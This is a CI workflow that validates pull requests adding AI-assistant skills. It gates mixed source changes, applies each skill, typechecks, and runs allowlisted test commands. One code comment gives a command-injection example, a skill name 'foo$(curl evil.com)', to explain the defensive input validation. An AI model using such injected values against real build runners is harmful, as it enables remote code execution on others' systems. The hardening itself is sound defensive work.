name: Skill PR Validation

on:
  pull_request:
    branches: [main]
    paths:
      - '.claude/skills/**'
      - 'skills-engine/**'

jobs:
  # ── Job 1: Policy gate ────────────────────────────────────────────────
  # Block PRs that add NEW skill files while also modifying source code.
  # Skill PRs should contain instructions for Claude, not raw source edits.
  policy-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Check for mixed skill + source changes
        run: |
          ADDED_SKILLS=$(git diff --name-only --diff-filter=A origin/main...HEAD \
            | grep '^\\.claude/skills/' || true)
          CHANGED=$(git diff --name-only origin/main...HEAD)
          SOURCE=$(echo "$CHANGED" \
            | grep -E '^src/|^container/|^package\.json|^package-lock\.json' || true)

          if [ -n "$ADDED_SKILLS" ] && [ -n "$SOURCE" ]; then
            echo "::error::PRs that add new skills should not modify source files."
            echo ""
            echo "New skill files:"
            echo "$ADDED_SKILLS"
            echo ""
            echo "Source files:"
            echo "$SOURCE"
            echo ""
            echo "Please split into separate PRs. See CONTRIBUTING.md."
            exit 1
          fi

      - name: Comment on failure
        if: failure()
        uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `This PR adds a skill while also modifying source code. A skill PR should not change source files—the skill should contain **instructions** for Claude to follow.

            If you're fixing a bug or simplifying code, please submit that as a separate PR.

            See [CONTRIBUTING.md](https://github.com/${context.repo.owner}/${context.repo.repo}/blob/main/CONTRIBUTING.md) for details.`
            })

  # ── Job 2: Detect which skills changed ────────────────────────────────
  detect-changed:
    runs-on: ubuntu-latest
    outputs:
      skills: ${{ steps.detect.outputs.skills }}
      has_skills: ${{ steps.detect.outputs.has_skills }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Detect changed skills
        id: detect
        run: |
          CHANGED_SKILLS=$(git diff --name-only origin/main...HEAD \
            | grep '^\\.claude/skills/' \
            | sed 's|^\.claude/skills/||' \
            | cut -d/ -f1 \
            | sort -u \
            | jq -R . | jq -s .)
          echo "skills=$CHANGED_SKILLS" >> "$GITHUB_OUTPUT"
          if [ "$CHANGED_SKILLS" = "[]" ]; then
            echo "has_skills=false" >> "$GITHUB_OUTPUT"
          else
            echo "has_skills=true" >> "$GITHUB_OUTPUT"
          fi
          echo "Changed skills: $CHANGED_SKILLS"

  # ── Job 3: Validate each changed skill in isolation ───────────────────
  validate-skills:
    needs: detect-changed
    if: needs.detect-changed.outputs.has_skills == 'true'
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        skill: ${{ fromJson(needs.detect-changed.outputs.skills) }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci

      - name: Initialize skills system
        run: >-
          npx tsx -e
          "import { initPaperclawDir } from './skills-engine/index'; initPaperclawDir();"

      # Validate the skill name once, up front. matrix.skill comes from the
      # PR's diff (a directory name under .claude/skills/), so it is attacker-
      # controlled on fork PRs. Funnel it through an env var (never interpolate
      # ${{ matrix.skill }} directly into a run: block — that would let a name
      # like "foo$(curl evil.com)" execute on the runner) and reject anything
      # outside the allowlist before any later step uses it.
      - name: Validate skill name
        env:
          SKILL: ${{ matrix.skill }}
        run: |
          if ! [[ "$SKILL" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "::error::Invalid skill directory name: $SKILL"
            echo "Allowed characters: a-z A-Z 0-9 _ -"
            exit 1
          fi
          echo "SKILL=$SKILL" >> "$GITHUB_ENV"

      - name: Apply skill
        run: npx tsx scripts/apply-skill.ts ".claude/skills/$SKILL"

      - name: Typecheck after apply
        run: npx tsc --noEmit

      # The manifest's `test:` field is also PR-controlled, so we cannot pipe
      # it through `eval`. Constrain it to the only shape skills actually use
      # — `npx vitest run <path>` — and reject anything else. After the regex
      # check the value contains no shell metacharacters, so word-splitting
      # the variable is enough to invoke it safely (no eval, no bash -c).
      #
      # SKILL is read from the env var rather than `${{ matrix.skill }}` so
      # that even a future regression in the validate step can't smuggle shell
      # metacharacters through GitHub Actions text substitution.
      - name: Run skill tests
        run: |
          TEST_CMD=$(npx tsx -e "
            import { parse } from 'yaml';
            import fs from 'fs';
            const skill = process.env.SKILL;
            const m = parse(fs.readFileSync('.claude/skills/' + skill + '/manifest.yaml', 'utf-8'));
            if (m.test) console.log(m.test);
          ")
          if [ -z "$TEST_CMD" ]; then
            echo "No test command defined, skipping"
            exit 0
          fi
          if ! [[ "$TEST_CMD" =~ ^npx[[:space:]]+vitest[[:space:]]+run[[:space:]]+[A-Za-z0-9._/-]+$ ]]; then
            echo "::error::Skill test command failed allowlist check."
            echo "Got:     $TEST_CMD"
            echo "Allowed: 'npx vitest run <path>' (path chars: A-Z a-z 0-9 . _ - /)"
            exit 1
          fi
          echo "Running: $TEST_CMD"
          # shellcheck disable=SC2086 -- intentional word splitting after allowlist
          $TEST_CMD

  # ── Summary gate for branch protection ────────────────────────────────
  skill-validation-summary:
    needs:
      - policy-check
      - detect-changed
      - validate-skills
    if: always()
    runs-on: ubuntu-latest
    steps:
      - name: Check results
        run: |
          echo "policy-check: ${{ needs.policy-check.result }}"
          echo "validate-skills: ${{ needs.validate-skills.result }}"

          if [ "${{ needs.policy-check.result }}" = "failure" ]; then
            echo "::error::Policy check failed"
            exit 1
          fi
          if [ "${{ needs.validate-skills.result }}" = "failure" ]; then
            echo "::error::Skill validation failed"
            exit 1
          fi
          echo "All skill checks passed"
